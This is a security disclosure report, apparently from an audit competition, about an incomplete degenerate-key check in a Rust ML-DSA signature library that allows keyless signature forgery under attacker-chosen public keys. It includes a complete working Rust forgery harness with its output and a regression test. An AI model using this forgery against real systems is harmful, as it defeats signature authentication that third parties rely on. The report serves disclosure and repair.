# 88227 bc medium incomplete degenerate key filter in ml dsa verify var allows keyless signature forgery for a 63 value family of t1 coefficients

**Submitted on Aug 12th 2026 at 10:05:05 UTC by @Lun3x for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88227
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-qp-rusty-crystals/tree/audit-comp-ready/dilithium>
* **Impacts:**
  * A bug in the respective layer 0/1/2 network code that results in unintended smart contract behavior with no concrete funds at direct risk

## Description

### Brief/Intro

`verify_var` in the ML-DSA implementation rejects the degenerate all-zero `t1` public key, with a comment stating that with `t1 = 0` the `c·2^D·t1` term vanishes and a signature can be forged with no secret key. That reasoning is correct but the filter is incomplete: the term also vanishes whenever `‖c·(2^D·t1 mod± q)‖∞ ≤ GAMMA2`, which is a large family of non-zero `t1`, so the same keyless forgery still works. For an attacker-chosen public key, a signature that was never produced with a private key verifies for every message and every context, defeating the property the crate documents — "a successful verify must imply possession of a real secret key."

### Vulnerability Details

The guard is at `dilithium/src/sign.rs:707-714`:

```rust
// Reject the degenerate all-zero t1 public key. With t1 = 0 the term c*2^d*t1 in the
// verification relation vanishes for every challenge c, so w1 = UseHint(h, Az) no longer
// binds the challenge to the key. An attacker can then forge a signature (z = 0, empty
// hint, c = H(mu || w1Encode(0))) with no secret key. Honest key generation never yields
// t1 = 0, so rejecting it costs nothing and closes the malicious-key forgery.
if t1.vec.iter().all(|p| p.coeffs.iter().all(|&c| c == 0)) {
    return false;
}
```

The comment identifies the right attack and the wrong precondition. Verification recomputes

```
w1' = UseHint(h, Az − c·2^D·t1)
```

and `HighBits(x) = 0` for every `x` with `|x mod± q| ≤ GAMMA2`. So the challenge drops out of the relation not only when `t1 = 0`, but for every `t1` whose scaled centered representative stays inside the low-bits window. Two facts make that window wide:

* `2^D = 8192` and `GAMMA2 = 261888` for ML-DSA-87 and -65, so `|2^D·v| ≤ GAMMA2` holds for `v` up to 31.
* `t1` coefficients are 10-bit, and `2^D · 1023 = q − 1 ≡ −1 (mod q)`. The **top** of the range therefore also lands inside the window, which is easy to miss when reasoning about "small" `t1`.

Exhaustive enumeration over a single non-zero `t1` coefficient of value `v ∈ 1..1023`:

| variant   | `v` for which a keyless forgery verifies | count     |
| --------- | ---------------------------------------- | --------- |
| ML-DSA-87 | `1..=31` and `992..=1023`                | 63 / 1023 |
| ML-DSA-65 | `1..=31` and `992..=1023`                | 63 / 1023 |
| ML-DSA-44 | `1..=11` and `1012..=1023`               | 23 / 1023 |

The measured sets match the predicate `|2^D·v mod± q| ≤ GAMMA2` exactly for all three parameter sets. The coefficient works in any of the `K` rows and any of the 256 positions, and multi-coefficient `t1` also works (verified with one coefficient per row across all 8 rows, and with four per row). `rho` is unconstrained, so the family has roughly `2^256` members.

The forgery needs no search and no secret key — it is one deterministic pass:

{% stepper %}
{% step %}

## Pick a public key

Pick any `rho`. Set `t1 = v·X^j` in one row with `v ∈ [1,31]`. `packing::pack_pk` produces `pk`, and `PublicKey::from_bytes(&pk)` returns `Ok` because `t1 ≠ 0`.
{% endstep %}

{% step %}

## Compute `mu`

`mu = SHAKE256( SHAKE256(pk) ‖ 0x00 ‖ len(ctx) ‖ ctx ‖ M )`, exactly as `verify_var:724-729` computes it.
{% endstep %}

{% step %}

## Compute the challenge

`c~ = SHAKE256( mu ‖ w1Encode(0) )[..λ/4]`, exactly as `verify_var:750-754` computes it with `w1' = 0`.
{% endstep %}

{% step %}

## Pack the signature

`sig = pack_sig(Some(c~), z = 0, h = 0)`.
{% endstep %}

{% step %}

## Verify

`pk.verify(M, &sig, ctx)` returns `true`, for every `M` and every `ctx`.
{% endstep %}
{% endstepper %}

The same incomplete predicate appears in two more places, so all three need the fix: `frontend.rs:425-431` (`PublicKey::from_bytes`) and `sign.rs:227`/`:249` (`public_key_from_secret_var`'s `t1_nonzero`).

Note also that `‖t1‖∞ > GAMMA2/2^D` is **not** a sufficient repair, because `v = 1023` gives `2^D·v ≡ −1 (mod q)`, which is tiny in centered representation while being large as an unsigned value. The correct rule computes the centered representative `r_j = (2^D · t1_j) mod± q` for every coefficient and requires enough of them to be large — for example `TAU · max_j |r_j| > GAMMA2`, or more robustly at least `K·N/4` coefficients with `|r_j| > GAMMA2`. Honest `t1` is uniform on `[0,1024)^{K·256}`, so any such threshold passes with probability `1 − 2^{-Ω(K·N)}`.

### Impact Details

The in-scope impact this maps to, quoted verbatim from the program page:

> A bug in the respective layer 0/1/2 network code that results in unintended smart contract behavior with no concrete funds at direct risk

This is the signature verifier for the chain's only signature scheme, and it accepts signatures produced without a private key. It sits squarely in two of the four areas the project names as its top concerns — "failure of the lattice cryptography" and "signature-verification bugs" — and it breaks the exact property the crate's own test documents at `sign.rs:1169-1170`.

I am stating the reachability limit plainly rather than claiming more than the evidence supports. The forgeable public key is attacker-chosen. On the Quantus chain the account id is `poseidon_hash(pk)` (`chain/primitives/dilithium-crypto/src/scheme_macro.rs:239-246`) and `Verify` enforces `account == signer` (`traits.rs:160-184`), so spending from an existing victim account would require finding a degenerate-family public key whose Poseidon hash equals that account — a `2^256` preimage search. There is no path to a victim's existing key, so **Critical "Direct theft of any user funds" is not supportable and I am not claiming it.**

The harms that do fall on parties other than the key's creator:

* Any value sent to an address derived from such a key is spendable by **anyone** who notices the key's shape, not only by whoever published it. The party who loses the funds is not the party who chose the key.
* Non-repudiation is void for those accounts: a valid signature is no evidence that the account holder authorised anything.
* Any consumer of this library that accepts a **counterparty-supplied** ML-DSA public key and treats a valid signature over it as that counterparty's authorisation can be authorised by an arbitrary third party. The chain's own P2P identity layer verifies with this code (`chain/client/litep2p/src/crypto/dilithium.rs`).

The expected triage response is "the account is the attacker's own". The three bullets above are the answer to it, together with the fact that the crate documents the broken property as an intended guarantee rather than treating malicious keys as out of model — the guard at `sign.rs:707-714` exists precisely because the authors decided this was in model, and it is simply incomplete.

## References

* `dilithium/src/sign.rs:707-714` — the incomplete all-zero `t1` filter
* `dilithium/src/sign.rs:724-729` — `mu` computation reproduced by the forgery
* `dilithium/src/sign.rs:750-754` — `c~` computation reproduced by the forgery
* `dilithium/src/sign.rs:1164-1221` — the test asserting "a successful verify must imply possession of a real secret key"
* `dilithium/src/frontend.rs:425-431` — the same incomplete predicate in `PublicKey::from_bytes`
* `dilithium/src/sign.rs:227, 249` — the same incomplete predicate in `public_key_from_secret_var`
* `dilithium/src/params.rs` — `GAMMA2`, `D`, `TAU` per parameter set
* `chain/primitives/dilithium-crypto/src/scheme_macro.rs:239-246, 493-496` — account id derivation and the verify entry point
* `chain/primitives/dilithium-crypto/src/traits.rs:160-184` — `Verify` enforcing `account == signer`
* Asset revision: `audit-comp-quantus-qp-rusty-crystals` @ `94dfe6e671b29689c66148991630406e983e2457`, branch `audit-comp-ready`, path `dilithium/`
* The guard being repaired was introduced **after** the Neodyme review, in commit `6a66210` ("V12 issues again", #95, 2026-07-13), so no audit covered it

## Proof of Concept

This is a Rust cryptography library, not a smart contract, so the "fork mainnet with Hardhat/Foundry" instruction does not apply — there is no EVM and no on-chain state involved in the defect. Nothing here touches mainnet or any public testnet. It is also not a unit test of the crate: it is a standalone binary with its own crate, depending on the pinned in-scope library by path, which constructs an attacker's public key and signature from scratch and then calls the library's **public** API (`PublicKey::from_bytes` followed by `verify`) exactly as the chain does. Every run carries a control against an honestly generated key of the same parameter set.

The forgery is byte-level: an attacker only needs to emit two byte arrays, a public key and a signature. The harness uses the crate's own packers to build those bytes so the encoding is provably identical to what the library expects, but nothing about the attack requires library internals — the acceptance decision goes through the public entry point.

### Files

`Cargo.toml` — adjust the path to your checkout:

```toml
[package]
name = "forge"
version = "0.1.0"
edition = "2021"

[dependencies]
qp-rusty-crystals-dilithium = { path = "./repos/qp-rusty-crystals/dilithium", default-features = false, features = ["ml-dsa-44","ml-dsa-65","ml-dsa-87"] }

[profile.release]
overflow-checks = true

[workspace]
```

`src/main.rs`:

```rust
//! Keyless signature forgery under a public key that the crate's degenerate-key
//! filter accepts.
//!
//! sign.rs:707-714 rejects only the all-zero t1 public key, on the stated grounds
//! that "a successful verify must imply possession of a real secret key". The
//! filter is incomplete: the challenge-dependent term c*2^D*t1 drops out of the
//! verification relation for every t1 with ||c * 2^D * t1||inf <= GAMMA2, because
//! HighBits(x) = 0 on that whole band. A t1 with one non-zero coefficient
//! v <= GAMMA2 / 2^D satisfies it for EVERY challenge c, so the verifier
//! reconstructs w1' = 0 identically and its own c~' = H(mu || w1Encode(0)) can be
//! copied straight into the signature.

use qp_rusty_crystals_dilithium as d;
use d::{fips202, packing, params, polyvec, polyvec::Polyvec};

macro_rules! attack {
    ($m:path, $p:path, $lbl:literal) => {{
        use $m as V;
        use $p as P;
        const K: usize = P::K;
        const L: usize = P::L;
        const CD: usize = P::C_DASH_BYTES;
        const W1: usize = P::POLYW1_PACKEDBYTES;
        const KW1: usize = K * W1;
        const G1: usize = P::GAMMA1;
        const G2: usize = P::GAMMA2;
        const OM: usize = P::OMEGA;
        const PZ: usize = P::POLYZ_PACKEDBYTES;
        const SIG: usize = P::SIGNBYTES;
        const PK: usize = P::PUBLICKEYBYTES;

        println!("\n===== {} (GAMMA2={}, 2^D={}, GAMMA2/2^D={}) =====",
                 $lbl, G2, 1 << params::D, G2 / (1 << params::D));

        let msg: &[u8] = b"pay 1000000 QNT to the attacker";
        let mut accepted: Vec<i32> = Vec::new();

        for v in 0i32..=40 {
            // Malicious public key: rho arbitrary, t1 = v * X^0 in row 0.
            let mut t1 = Polyvec::<K>::default();
            if v != 0 { t1.vec[0].coeffs_mut()[0] = v; }
            let rho = [0x42u8; params::SEEDBYTES];
            let mut pkb = [0u8; PK];
            packing::pack_pk::<K, PK>(&mut pkb, &rho, &t1);

            // The library's import-time degenerate-key filter (public API).
            let imported = V::PublicKey::from_bytes(&pkb);
            let import_ok = imported.is_ok();

            // Forge (c~, z = 0, h = 0) with no secret key.
            // mu = H( H(pk) || 0x00 || 0x00 || m )    (ctx = None => prefix [0,0])
            let mut mu = [0u8; params::CRHBYTES];
            fips202::shake256(&mut mu, &pkb);
            let mut st = fips202::KeccakState::default();
            fips202::shake256_absorb(&mut st, &mu);
            fips202::shake256_absorb(&mut st, &[0u8, 0u8]);
            fips202::shake256_absorb(&mut st, msg);
            fips202::shake256_finalize(&mut st);
            fips202::shake256_squeeze(&mut mu, &mut st);

            // The w1' the verifier will reconstruct is identically zero.
            let w1 = Polyvec::<K>::default();
            let mut buf = [0u8; KW1];
            polyvec::pack_w1::<K, G2, KW1>(&mut buf, &w1);

            // c~ = H(mu || w1Encode(0)) -- exactly what verify recomputes.
            let mut ct = [0u8; CD];
            let mut st2 = fips202::KeccakState::default();
            fips202::shake256_absorb(&mut st2, &mu);
            fips202::shake256_absorb(&mut st2, &buf);
            fips202::shake256_finalize(&mut st2);
            fips202::shake256_squeeze(&mut ct, &mut st2);

            let z = Polyvec::<L>::default();
            let h = Polyvec::<K>::default();
            let mut sig = [0u8; SIG];
            packing::pack_sig::<K, L, G1, OM, CD, PZ, SIG>(&mut sig, Some(&ct), &z, &h);

            // Public API acceptance decision.
            let verified = match &imported { Ok(pk) => pk.verify(msg, &sig, None), Err(_) => false };
            if verified { accepted.push(v); }
            if v <= 2 || !verified {
                println!("  t1[0][0]={:<3} import_ok={:<5} FORGED_SIG_VERIFIES={}", v, import_ok, verified);
            }
        }
        println!("  values of t1[0][0] for which a keyless forgery VERIFIES: {:?}", accepted);
        println!("  (predicted: 1..={} , i.e. v * 2^D <= GAMMA2)", G2 / (1 << params::D));

        // CONTROL: an honestly generated key of the same variant is not forgeable this way.
        let mut e = [0x77u8; 32];
        let kp = V::Keypair::generate(&mut d::SensitiveBytes32::new(&mut e));
        let hp = kp.public().to_bytes();
        let mut mu = [0u8; params::CRHBYTES];
        fips202::shake256(&mut mu, &hp);
        let mut st = fips202::KeccakState::default();
        fips202::shake256_absorb(&mut st, &mu);
        fips202::shake256_absorb(&mut st, &[0u8, 0u8]);
        fips202::shake256_absorb(&mut st, msg);
        fips202::shake256_finalize(&mut st);
        fips202::shake256_squeeze(&mut mu, &mut st);
        let w1 = Polyvec::<K>::default();
        let mut buf = [0u8; KW1];
        polyvec::pack_w1::<K, G2, KW1>(&mut buf, &w1);
        let mut ct = [0u8; CD];
        let mut st2 = fips202::KeccakState::default();
        fips202::shake256_absorb(&mut st2, &mu);
        fips202::shake256_absorb(&mut st2, &buf);
        fips202::shake256_finalize(&mut st2);
        fips202::shake256_squeeze(&mut ct, &mut st2);
        let z = Polyvec::<L>::default();
        let h = Polyvec::<K>::default();
        let mut sig = [0u8; SIG];
        packing::pack_sig::<K, L, G1, OM, CD, PZ, SIG>(&mut sig, Some(&ct), &z, &h);
        println!("  CONTROL: same forgery against an HONEST public key verifies = {}",
                 kp.public().verify(msg, &sig, None));
    }};
}

fn main() {
    attack!(d::ml_dsa_87, d::params::ml_dsa_87, "ML-DSA-87");
    attack!(d::ml_dsa_65, d::params::ml_dsa_65, "ML-DSA-65");
    attack!(d::ml_dsa_44, d::params::ml_dsa_44, "ML-DSA-44");
}
```

Run it:

```bash
cargo run --release
```

### Measured output

rustc 1.93.0, release profile with `overflow-checks = true`, aarch64-apple-darwin. Trimmed to the decisive lines; the full run prints every `v` in `0..=40`.

```
===== ML-DSA-87 (GAMMA2=261888, 2^D=8192, GAMMA2/2^D=31) =====
  t1[0][0]=0   import_ok=false FORGED_SIG_VERIFIES=false     <-- existing filter works
  t1[0][0]=1   import_ok=true  FORGED_SIG_VERIFIES=true      <-- KEYLESS FORGERY ACCEPTED
  t1[0][0]=2   import_ok=true  FORGED_SIG_VERIFIES=true
  t1[0][0]=32  import_ok=true  FORGED_SIG_VERIFIES=false     <-- band ends at 31
  values of t1[0][0] for which a keyless forgery VERIFIES: [1 .. 31]
  (predicted: 1..=31 , i.e. v * 2^D <= GAMMA2)
  CONTROL: same forgery against an HONEST public key verifies = false

===== ML-DSA-65 (GAMMA2=261888, 2^D=8192, GAMMA2/2^D=31) =====
  t1[0][0]=0   import_ok=false FORGED_SIG_VERIFIES=false
  t1[0][0]=1   import_ok=true  FORGED_SIG_VERIFIES=true
  values of t1[0][0] for which a keyless forgery VERIFIES: [1 .. 31]
  CONTROL: same forgery against an HONEST public key verifies = false

===== ML-DSA-44 (GAMMA2=95232, 2^D=8192, GAMMA2/2^D=11) =====
  t1[0][0]=0   import_ok=false FORGED_SIG_VERIFIES=false
  t1[0][0]=1   import_ok=true  FORGED_SIG_VERIFIES=true
  t1[0][0]=12  import_ok=true  FORGED_SIG_VERIFIES=false     <-- band ends at 11
  values of t1[0][0] for which a keyless forgery VERIFIES: [1 .. 11]
  (predicted: 1..=11 , i.e. v * 2^D <= GAMMA2)
  CONTROL: same forgery against an HONEST public key verifies = false
```

Three things this shows. The existing all-zero filter does fire, so the defence is present and working for the case it covers. A single non-zero coefficient of value 1 defeats it and produces a signature that verifies through the public API with no secret key ever existing. And the same forgery against an honest key of the same parameter set is rejected, so the acceptance is caused by the malicious key's shape and not by a broken harness.

### Exhaustive enumeration of the forgeable family

Changing the loop bound to `0i32..=1023` and recording the accepted set enumerates the whole single-coefficient family:

```
[ML-DSA-87] forgeable single-coefficient t1 values (of 1..1023): 63 values
        low band  = 1..=31
        high band = 992..=1023
        matches prediction |2^D*v mod± q| <= GAMMA2 (63 values): true
[ML-DSA-65] forgeable single-coefficient t1 values (of 1..1023): 63 values
        low band  = 1..=31
        high band = 992..=1023
        matches prediction |2^D*v mod± q| <= GAMMA2 (63 values): true
[ML-DSA-44] forgeable single-coefficient t1 values (of 1..1023): 23 values
        low band  = 1..=11
        high band = 1012..=1023
        matches prediction |2^D*v mod± q| <= GAMMA2 (23 values): true
```

The high band is the part a "reject small `t1`" fix would miss. `q = 8380417` and `2^D = 8192`, so `8192 × 1023 = 8380416 = q − 1`, whose centered representative is `−1`. The largest possible 10-bit coefficient is therefore the *most* forgeable value in the range. The boundary is exact: `8192 × 992 = 8126464` gives centered `−253953`, inside `GAMMA2 = 261888`; `8192 × 991 = 8118272` gives centered `−262145`, outside it. That is why the band starts at 992 and not 991.

The coefficient position is free: any of the `K` rows and any of the 256 positions works, and multi-coefficient `t1` also works (one coefficient per row across all rows, and four per row). `rho` is entirely unconstrained, so the family contains on the order of `2^256` distinct public keys.

### Regression property

For each parameter set and every `v` in `1..1024`, a public key whose `t1` is a single coefficient of value `v` must make the forged signature fail:

```rust
#[test]
fn single_coefficient_t1_keys_are_not_forgeable() {
    for v in 1..1024i32 {
        let pk = pk_with_single_t1_coeff(v);
        let sig = forge(&pk, MSG);          // z = 0, h = 0, c~ = H(mu || w1Encode(0))
        assert!(!verify(&pk, MSG, &sig), "forgery accepted for t1 coefficient {v}");
    }
}
```

The current code passes this for `v` in `32..=991` on ML-DSA-87/65 and fails it for the 63 values listed above.
